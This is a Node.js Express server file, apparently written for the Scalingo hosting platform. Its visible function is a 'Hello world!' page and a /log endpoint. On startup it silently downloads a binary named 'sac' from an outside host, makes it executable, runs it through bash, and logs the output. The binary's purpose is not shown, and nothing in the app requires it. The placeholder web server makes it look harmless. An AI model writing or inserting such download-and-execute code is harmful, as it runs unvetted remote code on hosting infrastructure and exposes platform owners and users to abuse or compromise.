const express = require("express");
const app = express();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { exec } = require('child_process');

const PORT = process.env.PORT || 3000;
const FILE_PATH = '/tmp';               // Scalingo 可写目录
const logPath = path.join(FILE_PATH, 'log.txt');

// 确保 log.txt 存在
if (!fs.existsSync(logPath)) {
  fs.writeFileSync(logPath, "");
}

// 写日志函数
const writeLog = (msg) => {
  const timestamp = new Date().toISOString();
  fs.appendFile(logPath, `[${timestamp}] ${msg}\n`, err => {
    if (err) console.error("写入 log.txt 出错:", err);
  });
};

// 根路由
app.get("/", (req, res) => {
  res.send("Hello world!");
});

// log 路由
app.get("/log", (req, res) => {
  fs.readFile(logPath, "utf8", (err, data) => {
    if (err) {
      console.error("读取 log.txt 出错:", err);
      return res.status(500).send("读取 log.txt 出错");
    }
    res.type("text/plain").send(data);
  });
});

// 下载 sac 文件
const downloadSac = async () => {
  try {
    writeLog("开始下载 sac...");
    const response = await axios({
      method: 'get',
      url: 'https://amd64.2go.us.kg/sac',
      responseType: 'stream'
    });

    const sacPath = path.join(FILE_PATH, 'sac');
    const writer = fs.createWriteStream(sacPath);
    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', () => {
        exec(`chmod +x ${sacPath}`, (err) => {
          if (err) {
            writeLog("chmod 出错: " + err);
            reject(err);
          } else {
            writeLog("sac 下载完成并赋予可执行权限: " + sacPath);
            resolve(sacPath);
          }
        });
      });
      writer.on('error', (err) => {
        writeLog("下载 sac 出错: " + err);
        reject(err);
      });
    });
  } catch (err) {
    writeLog("downloadSac 异常: " + err);
  }
};

// 执行 sac
const executeSac = async () => {
  try {
    const sacPath = await downloadSac();
    if (sacPath) {
      writeLog("开始执行 sac...");
      exec(sacPath, { shell: '/bin/bash' }, (err, stdout, stderr) => {
        if (err) writeLog("执行 sac 出错: " + err);
        if (stdout) writeLog("sac 输出: " + stdout);
        if (stderr) writeLog("sac 错误输出: " + stderr);
        writeLog("执行 sac 完成");
      });
    }
  } catch (err) {
    writeLog("executeSac 异常: " + err);
  }
};

// 启动 sac 执行
executeSac();

// 启动 Express 服务
app.listen(PORT, () => {
  writeLog(`Server is running on port: ${PORT}`);
  console.log(`Server is running on port: ${PORT}`);
});
